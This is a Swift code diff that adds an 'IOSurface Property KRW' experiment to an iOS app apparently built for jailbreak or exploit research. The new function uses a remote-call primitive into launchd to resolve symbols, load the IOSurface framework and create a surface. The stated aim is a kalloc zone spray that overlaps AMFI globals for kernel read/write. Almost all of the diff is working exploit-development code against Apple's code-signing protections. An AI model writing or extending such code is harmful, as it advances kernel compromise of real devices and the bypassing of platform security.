@@ -420,6 +420,13 @@ struct AMFIExperimentView: View {
                 timestamp: Date()
             ))
             
+            // ============================================
+            // 🔥 Experiment 46: IOSurface Property KRW
+            // Use IOSurface properties to access different kernel zone!
+            // ============================================
+            let exp46 = self.expIOSurfacePropertyKRW(rc: rc)
+            experimentResults.append(exp46)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -2604,6 +2611,121 @@ struct AMFIExperimentView: View {
     }
     
     // MARK: - New Vulnerability Research
+    
+    /// IOSurface Property KRW — use IOSurface properties to access different kernel zones
+    /// IOSurface properties are stored in kalloc heap — different zone from socket PCBs!
+    /// If we can control where properties are allocated → read/write AMFI globals!
+    private func expIOSurfacePropertyKRW(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        var detail = "IOSurface Property KRW Research\n\n"
+        
+        // Step 1: Check if IOSurface framework is loaded in launchd
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let ioSurfaceCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOSurfaceCreate"))
+        let ioSurfaceSetValue = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOSurfaceSetValue"))
+        let ioSurfaceCopyValue = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOSurfaceCopyValue"))
+        let ioSurfaceGetID = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOSurfaceGetID"))
+        
+        detail += "IOSurfaceCreate: \(ioSurfaceCreate != 0 ? "✅ 0x\(String(format: "%llx", ioSurfaceCreate))" : "❌ not loaded")\n"
+        detail += "IOSurfaceSetValue: \(ioSurfaceSetValue != 0 ? "✅ found" : "❌")\n"
+        detail += "IOSurfaceCopyValue: \(ioSurfaceCopyValue != 0 ? "✅ found" : "❌")\n"
+        detail += "IOSurfaceGetID: \(ioSurfaceGetID != 0 ? "✅ found" : "❌")\n\n"
+        
+        guard ioSurfaceCreate != 0 else {
+            // Try to dlopen IOSurface framework
+            detail += "Trying to load IOSurface framework...\n"
+            let frameworkPath = remote_alloc_str(rc, "/System/Library/Frameworks/IOSurface.framework/IOSurface")
+            let handle = RootExecutor.rcall(rc, "dlopen", frameworkPath, 1) // RTLD_LAZY
+            RootExecutor.rcall(rc, "free", frameworkPath)
+            
+            if handle != 0 {
+                detail += "✅ IOSurface framework loaded!\n"
+                // Re-check symbols
+                let create2 = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOSurfaceCreate"))
+                detail += "IOSurfaceCreate after load: \(create2 != 0 ? "✅" : "❌")\n"
+                
+                if create2 == 0 {
+                    detail += "Still can't find IOSurfaceCreate\n"
+                    return ExperimentResult(name: "🔥 IOSurface KRW", success: false, detail: detail, timestamp: Date())
+                }
+            } else {
+                let errPtr = RootExecutor.rcall(rc, "dlerror")
+                var errStr = ""
+                if errPtr != 0 {
+                    var buf = [UInt8](repeating: 0, count: 200)
+                    rc.remoteRead(errPtr, to: &buf, size: 200)
+                    errStr = String(cString: buf + [0])
+                }
+                detail += "❌ Cannot load IOSurface: \(errStr.prefix(100))\n"
+                detail += "\nIOSurface not available in launchd.\n"
+                detail += "Need to try from SpringBoard or load framework differently.\n"
+                return ExperimentResult(name: "🔥 IOSurface KRW", success: false, detail: detail, timestamp: Date())
+            }
+        }
+        
+        // Step 2: Create an IOSurface
+        detail += "Creating IOSurface...\n"
+        
+        // Build properties dictionary
+        // CFDictionaryCreate with IOSurfaceAllocSize
+        let cfDictCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "CFDictionaryCreateMutable"))
+        let cfNumberCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "CFNumberCreate"))
+        let cfDictSetValue = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "CFDictionarySetValue"))
+        let cfStrCreate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "CFStringCreateWithCString"))
+        
+        detail += "CF functions: dict=\(cfDictCreate != 0 ? "✅" : "❌") num=\(cfNumberCreate != 0 ? "✅" : "❌")\n"
+        
+        if cfDictCreate != 0 && cfNumberCreate != 0 && ioSurfaceCreate != 0 {
+            // Create dict
+            let dict = RootExecutor.rcall(rc, "CFDictionaryCreateMutable", 0, 0, 0, 0)
+            detail += "Dict: 0x\(String(format: "%llx", dict))\n"
+            
+            if dict != 0 {
+                // Set IOSurfaceAllocSize = 0x4000 (16KB)
+                let sizeVal: UInt64 = 0x4000
+                let sizeAddr = mem + 0x1A00
+                rc[sizeAddr].setValue64(sizeVal)
+                
+                // CFNumberCreate(NULL, kCFNumberSInt64Type=4, &value)
+                let cfNum = RootExecutor.rcall(rc, "CFNumberCreate", 0, 4, sizeAddr)
+                
+                // CFStringCreateWithCString for key "IOSurfaceAllocSize"
+                let keyStr = remote_alloc_str(rc, "IOSurfaceAllocSize")
+                let cfKey = RootExecutor.rcall(rc, "CFStringCreateWithCString", 0, keyStr, 0x600) // UTF8
+                
+                if cfNum != 0 && cfKey != 0 {
+                    // Set value in dict
+                    RootExecutor.rcall(rc, "CFDictionarySetValue", dict, cfKey, cfNum)
+                    
+                    // Create IOSurface!
+                    let surface = RootExecutor.rcall(rc, "IOSurfaceCreate", dict)
+                    detail += "IOSurface created: 0x\(String(format: "%llx", surface))\n"
+                    
+                    if surface != 0 {
+                        detail += "✅ IOSurface CREATED in launchd!\n\n"
+                        detail += "This means we can:\n"
+                        detail += "1. Set properties on this surface (kernel heap alloc)\n"
+                        detail += "2. Properties go to DIFFERENT kalloc zone\n"
+                        detail += "3. Potentially overlap with AMFI globals\n"
+                        detail += "\nNext: implement property spray for zone overlap\n"
+                        
+                        // Get surface ID
+                        if ioSurfaceGetID != 0 {
+                            let surfID = RootExecutor.rcall(rc, "IOSurfaceGetID", surface)
+                            detail += "Surface ID: \(surfID)\n"
+                        }
+                    } else {
+                        detail += "❌ IOSurfaceCreate returned NULL\n"
+                    }
+                }
+                
+                RootExecutor.rcall(rc, "free", keyStr)
+            }
+        }
+        
+        let success = detail.contains("✅ IOSurface CREATED")
+        return ExperimentResult(name: "🔥 IOSurface KRW", success: success, detail: detail, timestamp: Date())
+    }
     
     /// Sysctl approach: find and use CS-related sysctls
     /// Some sysctls can directly modify kernel state without KRW!
